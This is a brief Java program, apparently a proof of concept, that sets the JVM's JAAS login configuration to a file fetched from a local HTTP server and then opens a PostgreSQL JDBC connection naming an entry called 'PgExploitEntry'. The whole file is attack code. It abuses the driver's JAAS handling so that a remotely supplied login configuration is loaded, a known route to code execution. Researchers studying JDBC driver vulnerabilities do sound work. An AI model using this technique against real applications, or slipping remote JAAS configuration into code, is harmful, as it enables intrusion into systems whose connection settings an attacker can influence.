package com.jdbc.tricks;

import java.sql.Connection;
import java.sql.DriverManager;

/**
 * Hello world!
 */
public class App {
    public static void main(String[] args) throws Exception {
        System.setProperty("java.security.auth.login.config", "http://127.0.0.1:8000/remote_jaas.conf");
        String url = "jdbc:postgresql:///?user=ignored_user&password=fakepass&jaasApplicationName=PgExploitEntry";
        Connection conn = DriverManager.getConnection(url);
    }
}
